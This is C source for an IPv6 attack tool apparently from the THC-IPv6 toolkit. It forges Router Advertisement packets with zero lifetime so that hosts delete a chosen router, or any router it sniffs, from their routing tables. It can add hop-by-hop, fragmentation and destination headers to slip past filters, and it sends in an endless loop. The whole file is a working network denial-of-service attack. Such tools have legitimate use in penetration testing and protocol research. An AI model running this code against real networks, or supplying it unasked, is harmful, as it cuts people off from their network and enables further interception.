#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

char *frbuf, *frbuf2, *frint, buf3[1504];
int frbuflen, frbuf2len, do_hop = 0, do_frag = 0, do_dst = 0, type = NXT_ICMP6;
unsigned char *frip6, *frmac, *frdst;
thc_ipv6_hdr * frhdr = NULL;

void help(char *prg) {
  printf("%s %s (c) 2022 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s [-HFD] interface router-address [srcmac [dstmac]]\n\n",
         prg);
  printf(
      "Announce that a target a router going down to delete it from the "
      "routing tables.\n");
  printf(
      "If you supply a '*' as router-address, this tool will sniff the network "
      "for any\n");
  printf("RA packet and immediately send the kill packet.\n");
  printf(
      "Option -H adds hop-by-hop, -F fragmentation header and -D dst "
      "header.\n");
  //  printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

void send_ra_kill(u_char *foo, const struct pcap_pkthdr *header,
                  const unsigned char *data) {
  unsigned char *pkt = NULL, *src = (unsigned char *)data + 14 + 8,
                *srcmac = (unsigned char *)data + 6,
                *ipv6hdr = (unsigned char *)(data + 14), *target;
  int pkt_len = 0, cnt, i, len = header->caplen - 14, offset = 14;

  if (do_hdr_size) {
    src = (unsigned char *)(data + 8 + do_hdr_size);
    // srcmac is ignore anyway
    ipv6hdr = (unsigned char *)(data + do_hdr_size);
    len = header->caplen - do_hdr_size;
    if ((ipv6hdr[0] & 240) != 0x60) return;
    offset = do_hdr_size;
  }

  if (ipv6hdr[6] != NXT_ICMP6 || ipv6hdr[40] != ICMP6_ROUTERADV ||
      len < 40 + 16 || (ipv6hdr[46] == 0 && ipv6hdr[47] == 0))
    return;

  if ((pkt = thc_create_ipv6_extended(frint, PREFER_LINK, &pkt_len, src, frdst,
                                      255, 0, 0, 0xe0, 0)) == NULL)
    return;
  if (do_hop) {
    type = NXT_HBH;
    if (thc_add_hdr_hopbyhop(pkt, &pkt_len, frbuf2, frbuf2len) < 0) return;
  }
  if (do_frag) {
    type = NXT_FRAG;
    for (i = 0; i <= do_frag; i++)
      if (thc_add_hdr_oneshotfragment(pkt, &pkt_len, cnt++) < 0) return;
  }
  if (do_dst) {
    if (type == NXT_ICMP6) type = NXT_DST;
    if (thc_add_hdr_dst(pkt, &pkt_len, buf3, sizeof(buf3)) < 0) return;
  }
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_ROUTERADV, 0, 0x40080000, frbuf,
                    frbuflen, 0) < 0)
    return;
  if (do_dst) {
    thc_generate_pkt(frint, srcmac, NULL, pkt, &pkt_len);
    frhdr = (thc_ipv6_hdr *)pkt;
    thc_send_as_fragment6(frint, src, frdst, type, frhdr->pkt + 40 + offset,
                          frhdr->pkt_len - 40 - offset, 1240);
  } else {
    if (thc_generate_and_send_pkt(frint, srcmac, NULL, pkt, &pkt_len) < 0)
      return;
  }
  target = thc_ipv62notation(src);
  printf("Sent RA kill packet for %s\n", target);
  free(target);
  pkt = thc_destroy_packet(pkt);
}

int main(int argc, char *argv[]) {
  char *interface, mac[16] = "", dmac[16] = "",
                   string[] = "ip6 and icmp6 and dst ff02::1";
  unsigned char *mac6 = mac, *ip6;
  unsigned char  buf[512], *ptr, buf2[6];
  unsigned char *dst = thc_resolve6("ff02::1");
  unsigned char *dstmac = dmac;
  int            i, cnt, offset = 14;
  unsigned char *pkt = NULL;
  int            pkt_len = 0;
  int            rawmode = 0;
  pcap_t *       p;

  if (argc < 3 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  frdst = dst;
  while ((i = getopt(argc, argv, "FHDr")) >= 0) {
    switch (i) {
      case 'r':
        thc_ipv6_rawmode(1);
        rawmode = 1;
        break;
      case 'F':
        do_frag++;
        break;
      case 'H':
        do_hop = 1;
        break;
      case 'D':
        do_dst = 1;
        break;
      default:
        fprintf(stderr, "Error: invalid option %c\n", i);
        exit(-1);
    }
  }

  if (argc - optind < 2) help(argv[0]);

  frbuf = buf;
  frbuf2 = buf2;
  frbuf2len = sizeof(buf2);
  if (do_hdr_size) offset = do_hdr_size;

  interface = argv[optind];
  frint = argv[optind];
  if (argc - optind >= 4 && (ptr = argv[optind + 3]) != NULL)
    sscanf(ptr, "%x:%x:%x:%x:%x:%x", (unsigned int *)&dmac[0],
           (unsigned int *)&dmac[1], (unsigned int *)&dmac[2],
           (unsigned int *)&dmac[3], (unsigned int *)&dmac[4],
           (unsigned int *)&dmac[5]);
  else
    dstmac = NULL;
  if (argc - optind >= 3 && (ptr = argv[optind + 2]) != NULL)
    sscanf(ptr, "%x:%x:%x:%x:%x:%x", (unsigned int *)&mac[0],
           (unsigned int *)&mac[1], (unsigned int *)&mac[2],
           (unsigned int *)&mac[3], (unsigned int *)&mac[4],
           (unsigned int *)&mac[5]);
  else
    mac6 = thc_get_own_mac(interface);

  if (argv[optind + 1][0] == '*' || argv[optind + 1][1] == '*') {
    ip6 = NULL;
  } else {
    ip6 = thc_resolve6(argv[optind + 1]);
    if (ip6 == NULL) {
      fprintf(stderr, "Error: target-router address is invalid: %s\n",
              argv[optind + 1]);
      exit(-1);
    }
  }

  memset(buf, 0, sizeof(buf));
  memset(buf2, 0, sizeof(buf2));
  memset(buf3, 0, sizeof(buf3));
  i = 8;
  frbuflen = i;

  if ((p = thc_pcap_init_promisc(interface, string)) == NULL) {
    fprintf(stderr, "Error: could not capture on interface %s with string %s\n",
            interface, string);
    exit(-1);
  }

  if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, ip6,
                                      dst, 255, 0, 0, 0xe0, 0)) == NULL)
    return -1;

  if (do_hop) {
    type = NXT_HBH;
    if (thc_add_hdr_hopbyhop(pkt, &pkt_len, buf2, 6) < 0) return -1;
  }
  if (do_frag) {
    type = NXT_FRAG;
    for (i = 0; i <= do_frag; i++)
      if (thc_add_hdr_oneshotfragment(pkt, &pkt_len, cnt++) < 0) return -1;
  }
  if (do_dst) {
    if (type == NXT_ICMP6) type = NXT_DST;
    if (thc_add_hdr_dst(pkt, &pkt_len, buf3, sizeof(buf3)) < 0) return -1;
  }
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_ROUTERADV, 0, 0x40080000, buf, i, 0) <
      0)
    return -1;
  if (thc_generate_pkt(interface, mac6, dstmac, pkt, &pkt_len) < 0) return -1;
  frhdr = (thc_ipv6_hdr *)pkt;

  printf(
      "Starting to sending router kill entries for %s (Press Control-C to end) "
      "...\n",
      argv[optind + 1]);
  while (1) {
    if (ip6 == NULL) {
      while (thc_pcap_check(p, (char *)send_ra_kill, NULL) > 0)
        ;
    } else {
      if (do_dst) {
        thc_send_as_fragment6(interface, ip6, dst, type,
                              frhdr->pkt + 40 + offset,
                              frhdr->pkt_len - 40 - offset, 1240);
      } else {
        thc_send_pkt(interface, pkt, &pkt_len);
      }
      sleep(3);
      printf("RA kill packet to %s sent.\n", argv[optind + 1]);
    }
    usleep(60);
  }
  return 0;
}
